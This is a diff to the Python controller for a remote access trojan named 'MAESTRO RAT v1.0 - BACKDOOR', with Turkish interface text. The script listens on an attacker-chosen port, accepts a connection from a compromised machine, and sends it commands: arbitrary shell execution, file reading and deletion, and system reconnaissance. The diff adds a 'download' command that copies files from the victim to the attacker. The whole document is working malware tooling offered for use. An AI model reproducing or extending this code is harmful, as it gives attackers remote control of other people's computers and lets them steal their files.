@@ -1,45 +1,36 @@
 import socket
 import argparse
 from colorama import Fore, Style
+import os
 
-print(Fore.RED + """
-    ⠀
-    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣷⣦⣄        
-    ⠀⠀⣀⣤⣶⣶⣦⣄⠀⠈⣿⣿⣿⣿⡆            
-    ⠶⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣿⣷                 
-    ⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄                      
-    ⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⣤⣤⣤⡤              
-    ⠀⠀⢀⣠⣤⣼⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣤⣤    created by ramo
-    ⠐⠺⠿⢿⣿⣿⣿⣿⣿⡏⢸⡿⠋⠀⣼⠏⣿⣿⣿⣿⡿⠟⠉
-    ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣄⣀⡠⠞⠁               """)
-
-print(Fore.RED + """
-       MAESTRO RAT v1.0 
-       
-       
-                       """)
 
 def print_command_list():
-    print(f"{Fore.GREEN}Backdoor Komut Listesi:{Style.RESET_ALL}")
-    print(f"1. {Fore.CYAN}exit{Style.RESET_ALL}: Sunucu bağlantısını sonlandırır.")
-    print(f"2. {Fore.CYAN}execute{Style.RESET_ALL}: Belirli bir terminal komutunu sunucuda çalıştırır.")
-    print(f"3. {Fore.CYAN}cat [dosya_adı]{Style.RESET_ALL}: Belirtilen dosyanın içeriğini sunucudan istemciye gönderir.")
-    print(f"4. {Fore.CYAN}rm [dosya_adı]{Style.RESET_ALL} veya {Fore.CYAN}rm -r [dosya_adı]{Style.RESET_ALL}: Belirtilen dosyayı veya dizini siler.")
-    print(f"5. {Fore.CYAN}ls{Style.RESET_ALL} veya {Fore.CYAN}dir{Style.RESET_ALL}: Sunucudaki mevcut dizinin içeriğini listeler.")
-    print(f"6. {Fore.CYAN}cd [hedef_klasör]{Style.RESET_ALL}: Sunucudaki çalışma dizinini değiştirir.")
-    print(f"7. {Fore.CYAN}mkdir [klasör_adı]{Style.RESET_ALL}: Yeni bir klasör oluşturur.")
-    print(f"8. {Fore.CYAN}touch [dosya_adı]{Style.RESET_ALL} veya {Fore.CYAN}type nul > [dosya_adı]{Style.RESET_ALL}: Yeni bir dosya oluşturur.")
-    print(f"9. {Fore.CYAN}echo [metin] >> [dosya_adı]{Style.RESET_ALL}: Belirtilen dosyanın sonuna metin ekler.")
-    print(f"10. {Fore.CYAN}whoami{Style.RESET_ALL}: Sunucuda oturum açmış kullanıcıyı döndürür.")
-    print(f"11. {Fore.CYAN}ifconfig{Style.RESET_ALL}: Sunucunun ağ bilgilerini döndürür.")
-    print(f"12. {Fore.CYAN}cpu{Style.RESET_ALL}: Sunucunun CPU bilgilerini döndürür.")
-    print(f"13. {Fore.CYAN}memory{Style.RESET_ALL}: Sunucunun bellek kullanım bilgilerini döndürür.")
-    print(f"14. {Fore.CYAN}osinfo{Style.RESET_ALL}: Sunucunun işletim sistemi bilgilerini döndürür.")
+    commands = {
+        "exit": "Sunucu bağlantısını sonlandırır.",
+        "execute": "Belirli bir terminal komutunu sunucuda çalıştırır.",
+        "cat [dosya_adı]": "Belirtilen dosyanın içeriğini sunucudan istemciye gönderir.",
+        "rm [dosya_adı]": "Belirtilen dosyayı veya dizini siler.",
+        "ls": "Sunucudaki mevcut dizinin içeriğini listeler.",
+        "cd [hedef_klasör]": "Sunucudaki çalışma dizinini değiştirir.",
+        "mkdir [klasör_adı]": "Yeni bir klasör oluşturur.",
+        "touch [dosya_adı]": "Yeni bir dosya oluşturur.",
+    "echo [metin] >> [dosya_adı]": "Belirtilen dosyanın sonuna metin ekler.",
+        "whoami": "Sunucuda oturum açmış kullanıcıyı döndürür.",
+        "ifconfig": "Sunucunun ağ bilgilerini döndürür.",
+        "cpu": "Sunucunun CPU bilgilerini döndürür.",
+        "memory": "Sunucunun bellek kullanım bilgilerini döndürür.",
+        "osinfo": "Sunucunun işletim sistemi bilgilerini döndürür.",
+        "download ": "Sunucudan belirtilen dosyayı indirir."
+    }
 
+    print("Backdoor Komut Listesi:")
+    for command, description in commands.items():
+        print(f"{command.ljust(25)}: {description}")
+        
 def main():
-    parser = argparse.ArgumentParser(description='MAESTRO RAT v1.0 - Arka Kapı')
-    parser.add_argument('-lhost', dest='ip', help='Hedef IP adresi', required=True)
-    parser.add_argument('-lport', dest='port', help='Hedef port numarası', required=True)
+    parser = argparse.ArgumentParser(description='MAESTRO RAT v1.0 - BACKDOOR')
+    parser.add_argument('-lhost', dest='ip', help='YOUR IP ADRESS', required=True)
+    parser.add_argument('-lport', dest='port', help='YOUR PORT', required=True)
     args = parser.parse_args()
 
     ip = args.ip
@@ -51,7 +42,7 @@ def main():
         print(f"{Fore.RED}{ip}:{port} dinleniyor...")
 
         conn, addr = s.accept()  
-        print(f"{Fore.GREEN}Bağlantı alındı: {addr}")
+        print(f"{Fore.GREEN}{Style.RESET_ALL}Bağlantı alındı: {addr}")
 
         
         print_command_list()
@@ -61,12 +52,36 @@ def main():
             conn.send(komut.encode()) 
 
             if komut == 'exit':
-                break
+                soru = input("Gerçekten Bağlantıyı sonlandırılsın mı? (y/n) : ")
+                if soru == 'y':
+                    break
+                if soru == 'n':
+                    pass                    
 
-            if komut.strip() == 'execute':  
+            elif komut.strip() == 'execute':  
                 print("Lütfen 'execute' komutu için bir komut girin:")
                 islem = input()
                 conn.send(islem.encode())
+                
+            elif komut.strip() == 'download':
+                islem = input("İndirilecek Dosya İsmini Giriniz : ")
+                conn.send(islem.encode())                
+                
+                
+                file_data = conn.recv(8192)
+                if file_data.startswith('Dosya bulunamadı'.encode()):
+                    print(file_data.decode())
+                else:
+                    with open(islem, 'wb') as file:
+                        file.write(file_data)
+                    print(f"{islem} dosyası başarılı bir şekilde bulunduğunuz dizine indirildi.{Fore.GREEN}[√]{Style.RESET_ALL}")
+                    
+                         
+             
+                 
+                                
+                
+                
             else:
                 received_data = conn.recv(8192)  
                 print(received_data.decode(errors='ignore')) 
